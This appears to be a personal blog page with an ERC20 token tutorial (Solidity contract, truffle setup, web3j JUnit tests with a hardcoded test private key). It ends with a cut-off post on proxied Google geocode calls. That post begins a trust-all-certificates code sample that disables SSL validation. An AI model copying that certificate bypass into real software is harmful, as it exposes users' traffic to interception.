        <time class="dt-published" datetime="2018-08-25T06:36:43.000Z"><a href="/2018/08/25/ERC20_Token_Develop/">2018-08-25</a></time>
      
      
  
    <h1 class="title"><a href="/2018/08/25/ERC20_Token_Develop/">ERC20 TOKEN DEVELOP</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h2 id="Environment-setup"><a href="#Environment-setup" class="headerlink" title="Environment setup"></a>Environment setup</h2><p>Open C:\MinGW\msys\1.0\msys.bat</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yarn global add truffle</span><br><span class="line">yarn global add ganache-cli</span><br><span class="line"></span><br><span class="line"># download web3j and configue path</span><br><span class="line">export PATH=$PATH:/C/Users/tcsp01/AppData/Local/Yarn/Data/global/node_modules/.bin:/C/Users/tcsp01/Downloads/web3j-3.5.0/bin`</span><br></pre></td></tr></table></figure>

<h2 id="Start-enthereum-client-or-you-can-install-geth-windows-386-1-8-13-225171a4-exe"><a href="#Start-enthereum-client-or-you-can-install-geth-windows-386-1-8-13-225171a4-exe" class="headerlink" title="Start enthereum client (or you can install geth-windows-386-1.8.13-225171a4.exe)"></a>Start enthereum client (or you can install geth-windows-386-1.8.13-225171a4.exe)</h2><p><code>ganache-cli</code></p>
<h2 id="Compile-and-deploy-contract"><a href="#Compile-and-deploy-contract" class="headerlink" title="Compile and deploy contract"></a>Compile and deploy contract</h2><p>Open another command prompt<br>Reference <a target="_blank" rel="noopener" href="https://www.codeooze.com/blockchain/ethereum-truffle-hello-world/">https://www.codeooze.com/blockchain/ethereum-truffle-hello-world/</a> to initialize a project</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cd /d </span><br><span class="line">mkdir enthereumn-test &amp;&amp; cd enthereumn-test</span><br><span class="line">truffle init</span><br><span class="line">truffle console</span><br><span class="line">&gt; web3.eth.accounts</span><br><span class="line"></span><br><span class="line">truffle unbox tutorialtoken # init command no need to call</span><br><span class="line">truffle create contract TutorialToken # write your own contract</span><br><span class="line"></span><br><span class="line">yarn add openzeppelin-solidity</span><br></pre></td></tr></table></figure>

<p>Add following code to tutorialtoken.sol</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.22;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-solidity/contracts/token/ERC20/StandardToken.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract TutorialToken is StandardToken &#123;</span><br><span class="line">  string public name = &quot;TutorialToken&quot;;</span><br><span class="line">  string public symbol = &quot;TT&quot;;</span><br><span class="line">  uint8 public decimals = 2;</span><br><span class="line">  uint public INITIAL_SUPPLY = 12000;</span><br><span class="line"></span><br><span class="line">  constructor() public&#123;</span><br><span class="line">    totalSupply_ = INITIAL_SUPPLY;</span><br><span class="line">    balances[msg.sender] = INITIAL_SUPPLY;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Compile and migrate solidity code</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">truffle compile # compile contracts\*.sol =&gt; build\contracts\*.json</span><br><span class="line">truffle migrate # deploy contracts to ganache private network</span><br></pre></td></tr></table></figure>

<h2 id="Compile-contract-to-java-code"><a href="#Compile-contract-to-java-code" class="headerlink" title="Compile contract to java code"></a>Compile contract to java code</h2><p><code>web3j.bat truffle generate --javaTypes D:\entherumn_env\tutorial-coin\build\contracts\TutorialToken.json -o .\java -p tutorialtoken</code><br><code>web3j.bat truffle generate --javaTypes D:\entherumn_env\tutorial-coin\build\contracts\SampleCrowdsaleToken.json -o .\java -p tutorialtoken</code><br><code>web3j.bat truffle generate --javaTypes D:\entherumn_env\tutorial-coin\build\contracts\SampleCrowdsale.json -o .\java -p tutorialtoken</code></p>
<h2 id="Write-junit-to-test-the-smart-contract"><a href="#Write-junit-to-test-the-smart-contract" class="headerlink" title="Write junit to test the smart contract"></a>Write junit to test the smart contract</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line">package tutorialtoken;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.math.BigInteger;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">import org.apache.log4j.Logger;</span><br><span class="line">import org.junit.Before;</span><br><span class="line">import org.junit.Test;</span><br><span class="line">import org.web3j.crypto.Credentials;</span><br><span class="line">import org.web3j.protocol.Web3j;</span><br><span class="line">import org.web3j.protocol.admin.Admin;</span><br><span class="line">import org.web3j.protocol.admin.methods.response.NewAccountIdentifier;</span><br><span class="line">import org.web3j.protocol.admin.methods.response.PersonalUnlockAccount;</span><br><span class="line">import org.web3j.protocol.core.DefaultBlockParameterName;</span><br><span class="line">import org.web3j.protocol.core.methods.request.Transaction;</span><br><span class="line">import org.web3j.protocol.core.methods.response.EthAccounts;</span><br><span class="line">import org.web3j.protocol.core.methods.response.EthCoinbase;</span><br><span class="line">import org.web3j.protocol.core.methods.response.EthGetBalance;</span><br><span class="line">import org.web3j.protocol.core.methods.response.EthGetTransactionCount;</span><br><span class="line">import org.web3j.protocol.core.methods.response.EthGetTransactionReceipt;</span><br><span class="line">import org.web3j.protocol.core.methods.response.EthSendTransaction;</span><br><span class="line">import org.web3j.protocol.core.methods.response.TransactionReceipt;</span><br><span class="line">import org.web3j.protocol.http.HttpService;</span><br><span class="line">import org.web3j.tx.Contract;</span><br><span class="line"></span><br><span class="line">public class TutorialTokenTest &#123;</span><br><span class="line">    private Web3j web3j;</span><br><span class="line">    private Admin admin;</span><br><span class="line"></span><br><span class="line">    private EthCoinbase coinbase;</span><br><span class="line">    private Credentials coinBaseCredentials;</span><br><span class="line"></span><br><span class="line">    private String contractAddressOfTT = &quot;0xbea3c4344beb0e0681e3506d2e55315b6efe4c8b&quot;;</span><br><span class="line"></span><br><span class="line">    private static final Logger log = Logger.getLogger(TutorialTokenTest.class);</span><br><span class="line"></span><br><span class="line">    @Before</span><br><span class="line">    public void setup() throws IOException &#123;</span><br><span class="line">        web3j = Web3j.build(new HttpService(&quot;http://localhost:8545&quot;));</span><br><span class="line">        admin = Admin.build(new HttpService(&quot;http://127.0.0.1:8545&quot;));</span><br><span class="line"></span><br><span class="line">        String coinbaseAccountPrivatekey = &quot;0x0d10b7b76213f4b40fc95d8b3c1701213ba66bdd2a778279ad0f6165c51d73c5&quot;;</span><br><span class="line">        coinBaseCredentials = Credentials.create(coinbaseAccountPrivatekey);</span><br><span class="line"></span><br><span class="line">        coinbase = web3j.ethCoinbase().send();</span><br><span class="line"></span><br><span class="line">        web3j.transactionObservable().subscribe(tx -&gt; &#123;</span><br><span class="line">            log.info(String.format(&quot;New tx: id=%s, block=%s, from=%s, to=%s, value=%s&quot;, tx.getHash(), tx.getBlockHash(), tx.getFrom(), tx.getTo(), tx.getValue().intValue()));</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Test</span><br><span class="line">    public void showAccounts() throws IOException &#123;</span><br><span class="line">        List&lt;String&gt; account = web3j.ethAccounts().send().getAccounts();</span><br><span class="line">        //account.stream().forEach(a -&gt; log.info(a));</span><br><span class="line">        account.stream().forEach(System.out::println);</span><br><span class="line"></span><br><span class="line">        String coinbase = web3j.ethAccounts().send().getAccounts().get(0); // or coinbase = web3j.ethCoinbase().send();</span><br><span class="line">        log.info(&quot;coinbase = &quot; + coinbase);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Test</span><br><span class="line">    public void createAccount() throws IOException &#123;</span><br><span class="line">        String password = &quot;12345678&quot;;</span><br><span class="line">        NewAccountIdentifier newAccountIdentifier = admin.personalNewAccount(password).send();</span><br><span class="line">        String address = newAccountIdentifier.getAccountId();</span><br><span class="line">        log.info(&quot;New account address: &quot; + address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Test</span><br><span class="line">    public void unlockAccount() throws IOException &#123;</span><br><span class="line">        String password = &quot;12345678&quot;;</span><br><span class="line">        NewAccountIdentifier newAccountIdentifier = admin.personalNewAccount(password).send();</span><br><span class="line">        String address = newAccountIdentifier.getAccountId();</span><br><span class="line">        log.info(&quot;New account address 22: &quot; + address);</span><br><span class="line"></span><br><span class="line">        BigInteger unlockDuration = BigInteger.valueOf(60L);</span><br><span class="line">        try &#123;</span><br><span class="line">            PersonalUnlockAccount personalUnlockAccount = admin.personalUnlockAccount(address, password, unlockDuration).send();</span><br><span class="line">            Boolean isUnlocked = personalUnlockAccount.accountUnlocked();</span><br><span class="line">            log.info(&quot;Account unlock &quot; + isUnlocked);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Test</span><br><span class="line">    public void deployContract() throws Exception &#123;</span><br><span class="line">        //Credentials credentials = Credentials.create(&quot;0xf2064bdf023de8d86e5e4aedc04e3e176f89d8051cedbb95332a7ea9fb99dcc4&quot;);</span><br><span class="line">        TutorialToken tutorialToken = TutorialToken.deploy(web3j, coinBaseCredentials, Contract.GAS_PRICE, Contract.GAS_LIMIT).send();</span><br><span class="line">        if (tutorialToken.getTransactionReceipt().isPresent()) &#123;</span><br><span class="line">            log.info(&quot;TransactionReceipt: &quot; + tutorialToken.getTransactionReceipt().get());</span><br><span class="line">            contractAddressOfTT = tutorialToken.getContractAddress();</span><br><span class="line">            log.info(&quot;TutorialToken contractAddress: &quot; + contractAddressOfTT);</span><br><span class="line"></span><br><span class="line">            TutorialToken tutorialToken2 = TutorialToken.load(contractAddressOfTT, web3j, coinBaseCredentials, Contract.GAS_PRICE, Contract.GAS_LIMIT);</span><br><span class="line">            log.info(&quot;loaded tutorialToken: &quot; + tutorialToken2);</span><br><span class="line">            log.info(&quot;tutorialToken isValid: &quot; + tutorialToken2.isValid());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Test</span><br><span class="line">    public void balanceOfTutorialToken() throws Exception &#123;</span><br><span class="line">        //Credentials credentials = Credentials.create(&quot;0xf2064bdf023de8d86e5e4aedc04e3e176f89d8051cedbb95332a7ea9fb99dcc4&quot;);</span><br><span class="line">        //String contractAddress = &quot;0x15b4cd705c0646c551e264c3a5f5b0ac0ad0ad09&quot;;</span><br><span class="line"></span><br><span class="line">        TutorialToken tutorialToken = TutorialToken.load(contractAddressOfTT, web3j, coinBaseCredentials, Contract.GAS_PRICE, Contract.GAS_LIMIT);</span><br><span class="line">        BigInteger balance = tutorialToken.balanceOf(&quot;0x231cbc2edc97071b903aed2e7d90ec792c08c57e&quot;).send();</span><br><span class="line">        log.info(&quot;TT balance: &quot; + balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Test</span><br><span class="line">    public void transferTutorialToken() throws Exception &#123;</span><br><span class="line">        List&lt;String&gt; account = web3j.ethAccounts().send().getAccounts();</span><br><span class="line">        String account1 = account.get(0);</span><br><span class="line">        String account2 = account.get(1);</span><br><span class="line"></span><br><span class="line">        //String contractAddress = &quot;0x15b4cd705c0646c551e264c3a5f5b0ac0ad0ad09&quot;;</span><br><span class="line"></span><br><span class="line">        TutorialToken tutorialToken = TutorialToken.load(contractAddressOfTT, web3j, coinBaseCredentials, Contract.GAS_PRICE, Contract.GAS_LIMIT);</span><br><span class="line">        TransactionReceipt receipt = tutorialToken.transfer(account2, BigInteger.valueOf(2000)).send();</span><br><span class="line">        log.info(String.format(&quot;New tx: id=%s, block=%s, from=%s, to=%s&quot;, receipt.getTransactionHash(), receipt.getBlockHash(), receipt.getFrom(), receipt.getTo()));</span><br><span class="line"></span><br><span class="line">        BigInteger balance = tutorialToken.balanceOf(account1).send();</span><br><span class="line">        log.info(&quot;TT balance: &quot; + balance);</span><br><span class="line"></span><br><span class="line">        BigInteger balance2 = tutorialToken.balanceOf(account2).send();</span><br><span class="line">        log.info(&quot;balance2: &quot; + balance2);</span><br><span class="line"></span><br><span class="line">        tutorialToken.getTransferEvents(receipt).forEach(resp -&gt; &#123;</span><br><span class="line">            log.info(&quot;TT transaction, from: &quot; + resp.from + &quot;, to: &quot; + resp.to);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Test</span><br><span class="line">    public void etherBalance() throws IOException &#123;</span><br><span class="line">        EthGetTransactionCount transactionCount = web3j.ethGetTransactionCount(coinbase.getAddress(), DefaultBlockParameterName.LATEST).send();</span><br><span class="line">        Transaction transaction = Transaction.createEtherTransaction(coinbase.getAddress(), transactionCount.getTransactionCount(), BigInteger.valueOf(20_000_000_000L), BigInteger.valueOf(21_000),</span><br><span class="line">                coinBaseCredentials.getAddress(), BigInteger.valueOf(25_000_000_000_000_000L));</span><br><span class="line">        web3j.ethSendTransaction(transaction).send();</span><br><span class="line">        EthGetBalance balance = web3j.ethGetBalance(coinBaseCredentials.getAddress(), DefaultBlockParameterName.LATEST).send();</span><br><span class="line">        log.info(&quot;Ether Balance: &quot; + balance.getBalance().longValue());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Test</span><br><span class="line">    public void etherTransfer() throws IOException &#123;</span><br><span class="line">        EthAccounts accounts = web3j.ethAccounts().send();</span><br><span class="line">        for (int i = 1; i &lt; accounts.getAccounts().size(); i++) &#123;</span><br><span class="line">            EthGetTransactionCount transactionCount = web3j.ethGetTransactionCount(coinbase.getAddress(), DefaultBlockParameterName.LATEST).send();</span><br><span class="line">            Transaction transaction = Transaction.createEtherTransaction(coinbase.getAddress(), transactionCount.getTransactionCount(), Contract.GAS_PRICE, Contract.GAS_LIMIT,</span><br><span class="line">                    accounts.getAccounts().get(i), BigInteger.valueOf(25_000_000_000L));</span><br><span class="line"></span><br><span class="line">            EthSendTransaction response = web3j.ethSendTransaction(transaction).send();</span><br><span class="line">            if (response.getError() != null) &#123;</span><br><span class="line">                log.error(String.format(&quot;Transaction error: %s&quot;, response.getError().getMessage()));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            log.info(String.format(&quot;Transaction: %s, TransactionHash: %s&quot;, response.getResult(), response.getTransactionHash()));</span><br><span class="line">            EthGetTransactionReceipt receipt = web3j.ethGetTransactionReceipt(response.getTransactionHash()).send();</span><br><span class="line">            /*if (receipt.getTransactionReceipt().isPresent()) &#123;</span><br><span class="line">                TransactionReceipt r = receipt.getTransactionReceipt().get();</span><br><span class="line">                log.info(String.format(&quot;Tx receipt: from=%s, to=%s, gas=%s, cumulativeGas=%s&quot;, r.getFrom(), r.getTo(), r.getGasUsed().intValue(), r.getCumulativeGasUsed().intValue()));</span><br><span class="line">            &#125;*/</span><br><span class="line"></span><br><span class="line">            receipt.getTransactionReceipt()</span><br><span class="line">                    .ifPresent(r -&gt; log</span><br><span class="line">                            .info(String.format(&quot;Tx receipt: from=%s, to=%s, gas=%s, cumulativeGas=%s&quot;, r.getFrom(), r.getTo(), r.getGasUsed().intValue(), r.getCumulativeGasUsed().intValue())));</span><br><span class="line"></span><br><span class="line">            EthGetBalance balance = web3j.ethGetBalance(accounts.getAccounts().get(i), DefaultBlockParameterName.LATEST).send();</span><br><span class="line">            log.info(String.format(&quot;Ether Balance: address=%s, amount=%s&quot;, accounts.getAccounts().get(i), balance.getBalance().longValue()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Request-ether-from-Rinkeby"><a href="#Request-ether-from-Rinkeby" class="headerlink" title="Request ether from Rinkeby"></a>Request ether from Rinkeby</h2><p><a target="_blank" rel="noopener" href="https://gist.github.com/cryptogoth/10a98e8078cfd69f7ca892ddbdcf26bc">https://gist.github.com/cryptogoth/10a98e8078cfd69f7ca892ddbdcf26bc</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">windows 1: geth --datadir=./.rinkeby attach ipc:\\.\pipe\geth.ipc console</span><br><span class="line">windows 2: geth attach ipc:\\.\pipe\geth.ipc</span><br><span class="line">&gt; personal.newAccount(&quot;notmyrealpassword&quot;)</span><br><span class="line">&gt; eth.getBalance(eth.coinbase)</span><br></pre></td></tr></table></figure>

<p>Go to <a target="_blank" rel="noopener" href="https://www.rinkeby.io/#faucet">https://www.rinkeby.io/#faucet</a> and copy your post<br>Or<br><a target="_blank" rel="noopener" href="http://rinkeby-faucet.com/">http://rinkeby-faucet.com/</a><br><a target="_blank" rel="noopener" href="https://rinkeby.etherscan.io/balancecheck-tool">https://rinkeby.etherscan.io/balancecheck-tool</a><br><a target="_blank" rel="noopener" href="https://ethereum.stackexchange.com/questions/34718/how-do-i-buy-tokens-on-the-rinkeby-test-environment">https://ethereum.stackexchange.com/questions/34718/how-do-i-buy-tokens-on-the-rinkeby-test-environment</a></p>
<p>Register a infura.io account to get a access-api through https:&#x2F;infura.io&#x2F;register</p>
<p>endpoint: <a target="_blank" rel="noopener" href="https://rinkeby.infura.io/v3/your-api">https://rinkeby.infura.io/v3/your-api</a><br>note that rinkeby does not support following method</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">web3j.transactionObservable().subscribe(tx -&gt; &#123;</span><br><span class="line">    log.info(String.format(&quot;New tx: id=%s, block=%s, from=%s, to=%s, value=%s&quot;, tx.getHash(), tx.getBlockHash(), tx.getFrom(), tx.getTo(), tx.getValue().intValue()));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://stevenocean.github.io/2018/04/06/web3j-ethereum-token.html">https://stevenocean.github.io/2018/04/06/web3j-ethereum-token.html</a><br><a target="_blank" rel="noopener" href="https://dzone.com/articles/intro-to-blockchain-with-ethereum-web3j-and-spring">https://dzone.com/articles/intro-to-blockchain-with-ethereum-web3j-and-spring</a><br><a target="_blank" rel="noopener" href="https://www.codeooze.com/categories/blockchain/">https://www.codeooze.com/categories/blockchain/</a></p>
<p><a target="_blank" rel="noopener" href="https://truffleframework.com/tutorials/pet-shop">https://truffleframework.com/tutorials/pet-shop</a><br><a target="_blank" rel="noopener" href="https://truffleframework.com/docs/truffle/testing/writing-tests-in-javascript">https://truffleframework.com/docs/truffle/testing/writing-tests-in-javascript</a><br><a target="_blank" rel="noopener" href="https://truffleframework.com/tutorials/robust-smart-contracts-with-openzeppelin">https://truffleframework.com/tutorials/robust-smart-contracts-with-openzeppelin</a><br><a target="_blank" rel="noopener" href="https://metamask.io/">https://metamask.io</a><br><a target="_blank" rel="noopener" href="https://medium.com/@dmihal/create-an-erc20-token-using-zeppelin-ethpm-fc99f794d153">https://medium.com/@dmihal/create-an-erc20-token-using-zeppelin-ethpm-fc99f794d153</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/eugenp/tutorials/tree/master/ethereum">https://github.com/eugenp/tutorials/tree/master/ethereum</a><br><a target="_blank" rel="noopener" href="https://docs.web3j.io/getting_started.html#transactions">https://docs.web3j.io/getting_started.html#transactions</a><br><a target="_blank" rel="noopener" href="https://piotrminkowski.wordpress.com/2018/06/22/introduction-to-blockchain-with-java-using-ethereum-web3j-and-spring-boot/">https://piotrminkowski.wordpress.com/2018/06/22/introduction-to-blockchain-with-java-using-ethereum-web3j-and-spring-boot/</a><br><a target="_blank" rel="noopener" href="https://github.com/piomin/sample-spring-blockchain-contract">https://github.com/piomin/sample-spring-blockchain-contract</a></p>
<p><a target="_blank" rel="noopener" href="https://cryptozombies.io/">https://cryptozombies.io</a></p>
<p><a target="_blank" rel="noopener" href="https://theethereum.wiki/w/index.php/ERC20_Token_Standard">https://theethereum.wiki/w/index.php/ERC20_Token_Standard</a></p>
<h2 id="crowdsale"><a href="#crowdsale" class="headerlink" title="crowdsale"></a>crowdsale</h2><p><a target="_blank" rel="noopener" href="https://github.com/TokenMarketNet/ico">https://github.com/TokenMarketNet/ico</a><br><a target="_blank" rel="noopener" href="https://medium.com/@VladimirTikhomirov/how-its-made-crowdsale-contract-1120b487cc4a">https://medium.com/@VladimirTikhomirov/how-its-made-crowdsale-contract-1120b487cc4a</a><br><a target="_blank" rel="noopener" href="https://www.ethereum.org/crowdsale">https://www.ethereum.org/crowdsale</a><br><a target="_blank" rel="noopener" href="https://blog.zeppelin.solutions/how-to-create-token-and-initial-coin-offering-contracts-using-truffle-openzeppelin-1b7a5dae99b6">https://blog.zeppelin.solutions/how-to-create-token-and-initial-coin-offering-contracts-using-truffle-openzeppelin-1b7a5dae99b6</a><br><a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/examples/SampleCrowdsale.sol">https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/examples/SampleCrowdsale.sol</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-google-map-geocode-okhttp-proxy" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2018-07-25T06:36:43.000Z"><a href="/2018/07/25/google-map-geocode-okhttp-proxy/">2018-07-25</a></time>
      
      
  
    <h1 class="title"><a href="/2018/07/25/google-map-geocode-okhttp-proxy/">google map geocode okhttp proxy</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h2 id="In-order-to-call-google-maps-geocode-web-service-we-used-library-google-maps-services-java"><a href="#In-order-to-call-google-maps-geocode-web-service-we-used-library-google-maps-services-java" class="headerlink" title="In order to call google-maps geocode web service, we used library google-maps-services-java,"></a>In order to call google-maps geocode web service, we used library google-maps-services-java,</h2><p><a target="_blank" rel="noopener" href="https://github.com/googlemaps/google-maps-services-java">https://github.com/googlemaps/google-maps-services-java</a></p>
<h2 id="Sample-of-call-geocdoe-web-service"><a href="#Sample-of-call-geocdoe-web-service" class="headerlink" title="Sample of call geocdoe web service"></a>Sample of call geocdoe web service</h2><p><a target="_blank" rel="noopener" href="https://maps.googleapis.com/maps/api/geocode/json?address=1%20kowloon">https://maps.googleapis.com/maps/api/geocode/json?address=1%20kowloon</a></p>
<h2 id="Since-the-keystore-xx-egis-jks-is-configured-for-ssl-trust-store-in-wildfly-with-Djavax-net-ssl-trustStore-x3D-xx-egis-jks-we-have-two-ways-to-call-the-ssl-web-service"><a href="#Since-the-keystore-xx-egis-jks-is-configured-for-ssl-trust-store-in-wildfly-with-Djavax-net-ssl-trustStore-x3D-xx-egis-jks-we-have-two-ways-to-call-the-ssl-web-service" class="headerlink" title="Since the keystore xx_egis.jks is configured for ssl trust store in wildfly with -Djavax.net.ssl.trustStore&#x3D;xx_egis.jks, we have two ways to call the ssl web service,"></a>Since the keystore xx_egis.jks is configured for ssl trust store in wildfly with -Djavax.net.ssl.trustStore&#x3D;xx_egis.jks, we have two ways to call the ssl web service,</h2><h3 id="1-bypass-the-ssl-certificate-validation"><a href="#1-bypass-the-ssl-certificate-validation" class="headerlink" title="1. bypass the ssl certificate validation"></a>1. bypass the ssl certificate validation</h3><p>After investigation on the api of library google-maps-services-java, found that it did not expose the underly okhttp3.OkHttpClient, so it cannot apply following sample code to bypass ssl certificate validation,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">private static OkHttpClient.Builder configureToIgnoreCertificate(OkHttpClient.Builder builder) &#123;</span><br><span class="line">        LOGGER.warn(&quot;Ignore Ssl Certificate&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line"></span><br><span class="line">            // Create a trust manager that does not validate certificate chains</span><br><span class="line">            final TrustManager[] trustAllCerts = new TrustManager[] &#123;</span><br><span class="line">                    new X509TrustManager() &#123;</span><br><span class="line">                        @Override</span><br><span class="line">                        public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType)</span><br><span class="line">                                throws CertificateException &#123;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">      